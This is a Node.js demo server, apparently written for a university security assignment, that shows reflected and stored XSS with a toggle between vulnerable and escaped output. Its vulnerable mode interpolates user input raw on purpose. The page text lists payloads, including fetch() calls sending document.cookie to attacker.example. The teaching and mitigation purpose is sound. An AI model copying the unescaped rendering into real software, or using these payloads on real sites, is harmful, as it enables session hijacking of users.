/**
 * XSS Demo App — Reflected XSS + Stored XSS
 * ------------------------------------------------------------------
 * Built for: IIIT Allahabad, IT-30001 Cyber Security, Autumn 2026
 * Assignment: Web Server Security — Exploitation and Mitigation
 *
 * Zero dependencies — uses only Node's built-in 'http' module, so it
 * runs anywhere with just: node server.js
 *
 * This app demonstrates TWO XSS variants, each with a MODE SWITCH so
 * you can show, in the same demo, the vulnerable version executing a
 * payload and the mitigated version blocking the same payload.
 *
 *   1. Reflected XSS  -> GET /search?q=...
 *   2. Stored XSS      -> GET/POST /comments
 *
 * Toggle the global mode from the navbar, or by visiting:
 *   /mode/vulnerable
 *   /mode/safe
 *
 * IMPORTANT: Run this only on your own machine / your own group's
 * environment for the assignment demo. Do not deploy the vulnerable
 * mode on shared or public infrastructure.
 * ------------------------------------------------------------------
 */

const http = require("http");
const url = require("url");
const querystring = require("querystring");

const PORT = process.env.PORT || 3000;

// ---------------------------------------------------------------
// Global demo mode: "vulnerable" or "safe"
// (In a real app you would never ship a flag like this — it exists
//  here purely so the same codebase can demonstrate both states.)
// ---------------------------------------------------------------
let MODE = "vulnerable";

// In-memory "database" for the stored-XSS comment board.
// Reset on server restart — fine for a live demo.
let comments = [
  { id: 1, name: "Alice", text: "This workshop on web security is great!" },
  { id: 2, name: "Bob", text: "Looking forward to the next lecture." },
];
let nextId = 3;

// ---------------------------------------------------------------
// Minimal HTML-escaping helper used ONLY in "safe" mode.
// This is the mitigation: context-aware output encoding.
// ---------------------------------------------------------------
function escapeHtml(str) {
  if (typeof str !== "string") return "";
  return str
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#39;");
}

// ---------------------------------------------------------------
// Tiny layout helper
// ---------------------------------------------------------------
function page(title, mode, bodyHtml) {
  const badgeClass = mode === "vulnerable" ? "badge-vuln" : "badge-safe";
  const otherMode = mode === "vulnerable" ? "safe" : "vulnerable";
  const otherLabel = mode === "vulnerable" ? "SAFE" : "VULNERABLE";
  return `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>${escapeHtml(title)} | XSS Demo</title>
<style>${CSS}</style>
</head>
<body>
<header class="nav">
  <div class="nav-left">
    <a href="/" class="brand">XSS Demo</a>
    <a href="/search">Reflected</a>
    <a href="/comments">Stored</a>
  </div>
  <div class="nav-right">
    <span class="mode-label">Mode:</span>
    <span class="mode-badge ${badgeClass}">${mode.toUpperCase()}</span>
    <form action="/mode/${otherMode}" method="get" style="display:inline">
      <button type="submit" class="toggle-btn">Switch to ${otherLabel}</button>
    </form>
  </div>
</header>
<main class="container">
${bodyHtml}
</main>
</body>
</html>`;
}

// ---------------------------------------------------------------
// Page bodies
// ---------------------------------------------------------------
function homeBody() {
  return `
<h1>Cross-Site Scripting (XSS) Demo</h1>
<p class="subtitle">Reflected XSS and Stored XSS, each with a vulnerable mode and a mitigated mode, for IIIT Allahabad IT-30001 Cyber Security.</p>
<div class="card-grid">
  <a class="card" href="/search">
    <h2>1. Reflected XSS</h2>
    <p>A search box that echoes your query back into the page.</p>
  </a>
  <a class="card" href="/comments">
    <h2>2. Stored XSS</h2>
    <p>A comment board that saves and displays visitor comments.</p>
  </a>
</div>
<section class="notes">
  <h3>How to use this for your demo</h3>
  <ol>
    <li>Make sure the mode banner above says <strong>VULNERABLE</strong>.</li>
    <li>Submit the payload (e.g. <code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>) and show it executing.</li>
    <li>Switch the mode to <strong>SAFE</strong> using the toggle in the navbar.</li>
    <li>Submit the exact same payload again and screenshot it being rendered as inert text.</li>
  </ol>
</section>`;
}

// =================================================================
// VARIANT 1: REFLECTED XSS  ->  /search
// =================================================================
//
// (a) Vulnerable implementation: the 'q' query parameter is written
//     straight into the HTML response with no encoding.
// (c) Root cause: user-controlled input is concatenated into the
//     HTML response and the browser cannot tell injected markup
//     apart from the page's own markup.
// (d) Mitigation implemented: output encoding (escapeHtml) applied
//     to the value immediately before it is rendered, in "safe" mode.
//
function searchBody(q, mode) {
  let resultHtml;
  if (mode === "vulnerable") {
    // VULNERABLE: raw interpolation, no encoding.
    resultHtml = `<h2>Search results for: ${q}</h2><p>No matches found.</p>`;
  } else {
    // MITIGATED: HTML-encode before interpolation.
    resultHtml = `<h2>Search results for: ${escapeHtml(q)}</h2><p>No matches found.</p>`;
  }

  const explain =
    mode === "vulnerable"
      ? `<p class="warn">Current mode is <strong>VULNERABLE</strong>: <code>q</code> is interpolated into the HTML response with no encoding, so the payload executes as script.</p>`
      : `<p class="ok">Current mode is <strong>SAFE</strong>: <code>q</code> is passed through <code>escapeHtml()</code> before being rendered, so the same payload now appears as literal text instead of executing.</p>`;

  return `
<h1>Variant 1: Reflected XSS</h1>
<p class="subtitle">GET <code>/search?q=...</code> &mdash; the query string is echoed back into the page.</p>
<form action="/search" method="get" class="demo-form">
  <label for="q">Search query</label>
  <input id="q" name="q" type="text" value="${escapeHtml(q)}" placeholder="Try: &lt;script&gt;alert(document.cookie)&lt;/script&gt;" />
  <button type="submit">Search</button>
</form>
<div class="result-box">${resultHtml}</div>
<section class="explain">
  <h3>Try this payload</h3>
  <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
  <p>Or, to simulate cookie exfiltration to an attacker server:</p>
  <pre><code>&lt;script&gt;fetch('https://attacker.example/steal?c='+document.cookie)&lt;/script&gt;</code></pre>
  ${explain}
</section>`;
}

// =================================================================
// VARIANT 2: STORED XSS  ->  /comments
// =================================================================
//
// (a) Vulnerable implementation: a submitted comment is saved as-is
//     and later rendered, unescaped, to every visitor of the page.
// (c) Root cause: the stored value is rendered into HTML without
//     encoding at render time, so an injected <script>/event handler
//     persists and fires for every subsequent viewer, not just the
//     submitter.
// (d) Mitigation implemented: output encoding at render time (never
//     trust what's already in the database — encode on the way out).
//
function commentsBody(mode) {
  const rows = comments
    .map((c) => {
      const name = mode === "vulnerable" ? c.name : escapeHtml(c.name);
      const text = mode === "vulnerable" ? c.text : escapeHtml(c.text);
      return `<div class="comment"><strong>${name}</strong><div class="comment-text">${text}</div></div>`;
    })
    .join("\n");

  const explain =
    mode === "vulnerable"
      ? `<p class="warn">Current mode is <strong>VULNERABLE</strong>: comment text is rendered with no encoding, so the payload is stored once and then executes for every visitor who views this page.</p>`
      : `<p class="ok">Current mode is <strong>SAFE</strong>: comment text is passed through <code>escapeHtml()</code> at render time, so the same stored payload now displays as literal text instead of executing.</p>`;

  return `
<h1>Variant 2: Stored XSS</h1>
<p class="subtitle">Comments are saved on the server and rendered to every visitor of this page.</p>
<form action="/comments" method="post" class="demo-form">
  <label for="name">Name</label>
  <input id="name" name="name" type="text" placeholder="Your name" />
  <label for="text">Comment</label>
  <textarea id="text" name="text" rows="3" placeholder="Try: &lt;img src=x onerror=alert(document.cookie)&gt;"></textarea>
  <button type="submit">Post comment</button>
</form>
<form action="/comments/reset" method="post">
  <button type="submit" class="reset-btn">Reset comments</button>
</form>
<section class="comments">
  <h3>Comments</h3>
  ${rows}
</section>
<section class="explain">
  <h3>Try this payload (in the Comment box)</h3>
  <pre><code>&lt;img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)"&gt;</code></pre>
  <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
  ${explain}
</section>`;
}

const CSS = `
:root{--bg:#0f1115;--panel:#1a1d24;--border:#2a2e37;--text:#e8e9ed;--muted:#9aa0ab;--accent:#5b8cff;--danger:#ff5c6c;--danger-bg:#3a1419;--ok:#3ddc84;--ok-bg:#0f2a1c}
*{box-sizing:border-box}
body{margin:0;background:var(--bg);color:var(--text);font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;line-height:1.5}
.nav{display:flex;justify-content:space-between;align-items:center;padding:14px 24px;background:var(--panel);border-bottom:1px solid var(--border);position:sticky;top:0;z-index:10;flex-wrap:wrap;gap:10px}
.nav-left a{color:var(--text);text-decoration:none;margin-right:18px;font-size:14px}
.nav-left .brand{font-weight:700;color:var(--accent);margin-right:24px}
.nav-left a:hover{color:var(--accent)}
.nav-right{display:flex;align-items:center;gap:10px;font-size:14px}
.mode-label{color:var(--muted)}
.mode-badge{padding:3px 10px;border-radius:12px;font-weight:700;font-size:12px;letter-spacing:.04em}
.badge-vuln{background:var(--danger-bg);color:var(--danger)}
.badge-safe{background:var(--ok-bg);color:var(--ok)}
.toggle-btn,button{background:var(--accent);color:#0b0e14;border:none;padding:8px 14px;border-radius:6px;font-weight:600;cursor:pointer;font-size:13px}
.toggle-btn:hover,button:hover{opacity:.9}
.reset-btn{background:var(--border);color:var(--text)}
.container{max-width:760px;margin:0 auto;padding:32px 24px 80px}
h1{margin-bottom:4px}
.subtitle{color:var(--muted);margin-top:0}
.card-grid{display:grid;grid-template-columns:1fr 1fr;gap:16px;margin:24px 0}
.card{display:block;background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:18px;text-decoration:none;color:var(--text);transition:border-color .15s}
.card:hover{border-color:var(--accent)}
.card h2{margin:0 0 6px;font-size:18px}
.card p{margin:0;color:var(--muted);font-size:14px}
.notes{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:18px 22px;margin-top:24px}
.notes code{background:#000;padding:2px 5px;border-radius:4px;font-size:12px}
.demo-form{display:flex;flex-direction:column;gap:8px;background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:18px;margin:18px 0}
.demo-form label{font-size:13px;color:var(--muted)}
.demo-form input,.demo-form textarea{background:#0b0e14;border:1px solid var(--border);color:var(--text);padding:9px 11px;border-radius:6px;font-size:14px;font-family:inherit}
.demo-form button{align-self:flex-start;margin-top:4px}
.result-box{background:var(--panel);border:1px dashed var(--border);border-radius:10px;padding:16px 20px;min-height:48px}
.comments{margin-top:12px}
.comment{background:var(--panel);border:1px solid var(--border);border-radius:8px;padding:10px 14px;margin-bottom:10px}
.comment-text{margin-top:4px;color:var(--text)}
.explain{margin-top:28px;background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:18px 22px}
.explain pre{background:#000;padding:10px 12px;border-radius:6px;overflow-x:auto;font-size:13px}
.warn{color:var(--danger);font-weight:600}
.ok{color:var(--ok);font-weight:600}
@media (max-width:560px){.card-grid{grid-template-columns:1fr}}
`;

// ---------------------------------------------------------------
// Minimal router
// ---------------------------------------------------------------
function readBody(req, cb) {
  let data = "";
  req.on("data", (chunk) => (data += chunk));
  req.on("end", () => cb(querystring.parse(data)));
}

function send(res, status, html) {
  res.writeHead(status, { "Content-Type": "text/html; charset=utf-8" });
  res.end(html);
}

function redirect(res, location) {
  res.writeHead(302, { Location: location });
  res.end();
}

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true);
  const pathname = parsed.pathname;

  if (req.method === "GET" && pathname === "/") {
    return send(res, 200, page("Home", MODE, homeBody()));
  }

  if (req.method === "GET" && pathname === "/search") {
    const q = parsed.query.q || "";
    return send(res, 200, page("Reflected XSS", MODE, searchBody(q, MODE)));
  }

  if (req.method === "GET" && pathname === "/comments") {
    return send(res, 200, page("Stored XSS", MODE, commentsBody(MODE)));
  }

  if (req.method === "POST" && pathname === "/comments") {
    return readBody(req, (fields) => {
      const name = (fields.name || "Anonymous").toString().slice(0, 50);
      const text = (fields.text || "").toString();
      // Note: input is stored as-is in BOTH modes. The mitigation is
      // applied at render time (see commentsBody), which is correct —
      // encoding on the way in doesn't protect every later rendering
      // context and can corrupt legitimate data.
      comments.push({ id: nextId++, name, text });
      redirect(res, "/comments");
    });
  }

  if (req.method === "POST" && pathname === "/comments/reset") {
    comments = [
      { id: 1, name: "Alice", text: "This workshop on web security is great!" },
      { id: 2, name: "Bob", text: "Looking forward to the next lecture." },
    ];
    nextId = 3;
    return redirect(res, "/comments");
  }

  if (req.method === "GET" && pathname.startsWith("/mode/")) {
    const m = pathname.split("/")[2];
    if (m === "vulnerable" || m === "safe") MODE = m;
    return redirect(res, req.headers.referer || "/");
  }

  send(res, 404, page("Not found", MODE, "<h1>404 - Not found</h1>"));
});

server.listen(PORT, () => {
  console.log(`XSS demo running at http://localhost:${PORT}`);
  console.log(`Current mode: ${MODE} (toggle via the navbar)`);
});
